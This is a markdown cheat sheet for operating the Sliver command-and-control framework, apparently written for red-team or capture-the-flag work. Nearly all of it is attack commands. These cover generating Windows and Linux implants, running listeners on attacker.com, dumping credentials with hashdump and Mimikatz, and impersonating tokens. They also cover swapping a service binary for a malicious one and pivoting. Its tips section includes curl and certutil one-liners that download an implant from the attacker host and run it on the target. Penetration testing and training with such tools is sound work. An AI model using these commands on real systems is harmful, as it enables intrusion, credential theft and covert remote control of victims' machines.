# C2 Framework - Sliver

## Table of Contents

- [Installation](#installation)
- [Starting Sliver](#starting-sliver)
- [Implant Generation](#implant-generation)
- [Listeners](#listeners)
- [Session Management](#session-management)
- [Post-Exploitation](#post-exploitation)
- [Armory (Extensions)](#armory-extensions)
- [Pivoting](#pivoting)
- [Profiles](#profiles)
- [Useful Tips](#useful-tips)
- [Quick Reference](#quick-reference)

---

## Installation

### Quick Install

```shell
# One-liner install
curl https://sliver.sh/install | sudo bash

# Start service
sudo systemctl start sliver
sudo systemctl enable sliver
```

### Manual Install

```shell
# Download latest release
wget https://github.com/BishopFox/sliver/releases/latest/download/sliver-server_linux

# Make executable
chmod +x sliver-server_linux

# Run
./sliver-server_linux
```

### Client Setup

```shell
# Generate client config (on server)
./sliver-server operator --name kali --lhost $lhost --save operator.cfg

# Use config on client
./sliver-client import operator.cfg
./sliver-client
```

---

## Starting Sliver

```shell
# Start console
sliver

# Or as service
sudo systemctl start sliver
sliver
```

---

## Implant Generation

### Linux Implant

```shell
# Basic Linux implant
sliver > generate --os linux --mtls $lhost --name linux_agent

# With specific port
sliver > generate --os linux --mtls $lhost:8888 --name linux_agent

# With HTTP fallback
sliver > generate --os linux --mtls $lhost --http $lhost --name linux_agent
```

### Windows Implant

```shell
# Windows EXE
sliver > generate --os windows --arch amd64 --mtls $lhost:8888 --name win_agent --format exe

# Windows DLL
sliver > generate --os windows --arch amd64 --mtls $lhost:8888 --name win_agent --format dll

# Windows shellcode
sliver > generate --os windows --mtls $lhost -f shellcode --name win_agent
```

### Beacon Mode (Slower but stealthier)

```shell
# Generate beacon (periodic check-in)
sliver > generate beacon --os windows --mtls $lhost --name beacon_agent

# With jitter and interval
sliver > generate beacon --os windows --mtls $lhost --seconds 60 --jitter 30 --name beacon_agent
```

### View Generated Implants

```shell
sliver > implants
```

---

## Listeners

### mTLS Listener (Recommended)

```shell
# Start mTLS listener
sliver > mtls

# On specific port
sliver > mtls -l 8888

# With specific interface
sliver > mtls -L $lhost -l 8888
```

### HTTPS Listener

```shell
sliver > https

# With custom port and domain
sliver > https -l 443 -d attacker.com
```

### HTTP Listener

```shell
sliver > http -l 8080
```

### DNS Listener

```shell
sliver > dns -d attacker.com
```

### View Active Listeners

```shell
sliver > jobs
```

---

## Session Management

### View Sessions

```shell
# List all sessions
sliver > sessions

# List implants
sliver > implants
```

### Interact with Session

```shell
# Enter session by ID
sliver > sessions -i <session_id>

# Example
sliver > sessions -i 74174d6c
```

### Basic Commands in Session

```shell
# Get shell
sliver (agent) > shell

# Execute command
sliver (agent) > execute -o whoami
sliver (agent) > execute -o "net user"

# Process list
sliver (agent) > ps

# Search for specific process
sliver (agent) > ps -e "postgres"

# Get info
sliver (agent) > info
sliver (agent) > getuid
sliver (agent) > getgid
sliver (agent) > pwd
sliver (agent) > ls
```

### File Operations

```shell
# Upload file
sliver (agent) > upload /path/to/local/file /remote/path

# Download file
sliver (agent) > download /remote/path /path/to/local/

# Delete file
sliver (agent) > rm /remote/file

# Move/rename file
sliver (agent) > mv old_name new_name

# Change directory
sliver (agent) > cd /path/to/dir
```

---

## Post-Exploitation

### Windows Commands

```shell
# Get system info
sliver (agent) > info

# Screenshot
sliver (agent) > screenshot

# Process migration
sliver (agent) > migrate <pid>

# Execute assembly
sliver (agent) > execute-assembly /path/to/assembly.exe

# In-memory .NET execution
sliver (agent) > execute-assembly /path/to/SharpUp.exe audit
```

### Credential Harvesting

```shell
# Dump SAM/SYSTEM
sliver (agent) > hashdump

# Mimikatz (via sideload)
sliver (agent) > sideload /path/to/mimikatz.dll "sekurlsa::logonpasswords"
```

### Privilege Escalation

```shell
# Check current privileges
sliver (agent) > getuid
sliver (agent) > getprivs

# Impersonate token
sliver (agent) > impersonate <username>
sliver (agent) > rev2self
```

---

## Armory (Extensions)

### Install Extensions

```shell
# Update armory
sliver > armory update

# List available extensions
sliver > armory

# Install specific extension
sliver (agent) > armory install sharpup
sliver (agent) > armory install situational-awareness
sliver (agent) > armory install cs-remote-ops-bofs
sliver (agent) > armory install .net-recon
```

### Using Extensions

```shell
# SharpUp audit
sliver (agent) > sharpup audit

# Situational awareness
sliver (agent) > sa-sc-qc localhost <ServiceName>

# Check service permissions
sliver (agent) > sa-cacls "C:\path\to\service.exe"
```

### Service Exploitation (Example)

```shell
# Query service
sliver (agent) > sa-sc-qc localhost VulnerableService

# Check permissions
sliver (agent) > sa-cacls "C:\Program Files\VulnApp\service.exe"

# Replace binary
sliver (agent) > cd C:/"Program Files"/VulnApp
sliver (agent) > rm service.exe
sliver (agent) > upload /path/to/malicious.exe
sliver (agent) > mv malicious.exe service.exe

# Start service
sliver (agent) > remote-sc-start localhost VulnerableService
```

---

## Pivoting

### Setup SOCKS Proxy

```shell
# Start SOCKS5 proxy through session
sliver (agent) > socks5 start

# Use with proxychains
# Add to /etc/proxychains4.conf:
# socks5 127.0.0.1 1081
```

### Port Forwarding

```shell
# Local port forward
sliver (agent) > portfwd add --local 127.0.0.1:8080 --remote 10.10.10.10:80

# List port forwards
sliver (agent) > portfwd

# Remove
sliver (agent) > portfwd remove --id <id>
```

---

## Profiles

### Create Profile

```shell
# Create reusable profile
sliver > profiles new --mtls $lhost --os windows --arch amd64 --format exe win_profile

# Generate from profile
sliver > generate --profile win_profile --name agent1
```

---

## Useful Tips

### Serve Implants

```shell
# Python HTTP server
python3 -m http.server 8000

# On target (Linux)
curl http://$lhost:8000/agent -o /dev/shm/agent
chmod +x /dev/shm/agent && /dev/shm/agent

# On target (Windows)
certutil -urlcache -split -f http://$lhost:8000/agent.exe C:\Windows\Temp\agent.exe
C:\Windows\Temp\agent.exe
```

### Kill Session

```shell
sliver > sessions -k <session_id>
```

### Kill All

```shell
sliver > sessions -K
```

---

## Quick Reference

| Task | Command |
| --- | --- |
| Start listener | `mtls` |
| Generate Linux | `generate --os linux --mtls $lhost --name agent` |
| Generate Windows | `generate --os windows --mtls $lhost --name agent --format exe` |
| List sessions | `sessions` |
| Enter session | `sessions -i <id>` |
| Get shell | `shell` |
| Upload file | `upload /src /dst` |
| Download file | `download /remote /local` |
| Start SOCKS | `socks5 start` |
| Port forward | `portfwd add --local 127.0.0.1:8080 --remote 10.10.10.10:80` |
